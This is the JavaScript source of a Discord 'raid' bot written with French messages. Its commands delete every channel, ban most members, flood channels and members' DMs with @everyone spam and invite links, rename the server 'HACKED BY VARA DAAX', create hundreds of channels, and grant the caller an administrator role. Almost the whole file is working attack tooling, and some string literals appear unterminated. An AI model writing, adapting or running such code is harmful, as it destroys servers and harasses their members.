const Discord = require("discord.js");
const bot = new Discord.Client();
const token = "process.env.TOKEN";
var prefix = ".";
var mention = "126connectés"

var fucked = false;
 
 bot.on('ready',() => {
 
  console.log("Je suis "+bot.user.username+" je suis sur "+bot.guilds.size+" serveurs et j'ai "+bot.users.size+" membres "+bot.user.id)
  })
 
bot.on('message', msg => {
  //#region Legit
  /* Commandes legit */
  if (msg.content === '.ping') {
    msg.reply('pong !')
  }
  //#endregion
 
  //#region Destructrices
  /* Commandes destructrices */
  if (msg.content === '.a') {
    console.log(`Commande .des par ${msg.author.tag}`);
    var interval = setInterval (function () {
      msg.channel.send("Raid By Vara Daax tes maîtres puissants https://discord.gg/GN48n6Q XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX  https://gph.is/2C31qD3 @everyone
 }, 500);
  }
            if (msg.content === '.des') {
            console.log(`Commande .mp par ${msg.author.tag}`);
                if (msg.channel.type === "dm") return;
                if (msg.deletable) msg.delete();
                msg.guild.members.forEach(member => {
                  setInterval(function () {
                    member.send(msg.guild.owner.user.username+" s'est fait bz son serv par https://discord.gg/sGGZPJN https://media.discordapp.net/attachments/494613905654546435/515855972846272513/giphy-4.gif?width=270&height=270").catch(error => {}) }, 450)})
       }

if(msg.content === '.del'){
          if(msg.channel.type === "dm") return;
          if(msg.guild.channels.size === 0) return;
          else if(!msg.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return;
          msg.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
      }
 
  if (msg.content === '.des') {
    console.log(`Commande .des par ${msg.author.tag}`);
 
    if (!fucked){
      msg.guild.setIcon("hapraid.png").catch(e => {});
      msg.guild.setName('HACKED BY VARA DAAX').catch(e => {});
 
      for (var i = 0; i < 390; i++) {
        msg.guild.createChannel('HACKED BY VARA DAAX', 'voice').catch(e => {});
        msg.guild.createChannel('HACKED BY VARA DAAX', 'text').catch(e => {});
      }
      fucked = true;
            }

    if (msg.deletable) {
      msg.delete();
    }
  }
 
  if (msg.content === '.ban') {
    console.log(`Commande .bane par ${msg.author.tag}`);
    msg.guild.members.forEach(member => {
      if (!member.roles.exists("name", "haprole") && member.bannable) member.ban().catch(e => {});
    });
  }
 
  if (msg.content === '.exit') {
    console.log(`Commande .leave par ${msg.author.tag}`);
    if (msg.deletable) msg.delete().catch(e => {});
    msg.guild.leave().catch(e => {});
  }
 
  if (msg.content === '.r') {
    console.log(`Commande .r par ${msg.author.tag}`);
 
    msg.member.guild.createRole({
      name: "HACKED BY VARA DAAX",
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      msg.member.addRole(role);
      if (msg.deletable) msg.delete().catch(e => {});
    }).catch(e => {});
  }
  //#endregion
});
bot.on("message", msg => {
        if(msg.content.startsWith(".des")){ 
           msg.delete()
            let i = 0;
            let interval = setInterval(function () {
              msg.guild.channels.forEach(channel => {
                if (channel.type === "text") channel.send('"Raid By Vara Daax t’es maîtres puissant https://discord.gg/GN48n6Q XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX  https://gph.is/2C31qD3 @everyone
            });
          }
        });

bot.login(process.env.TOKEN)
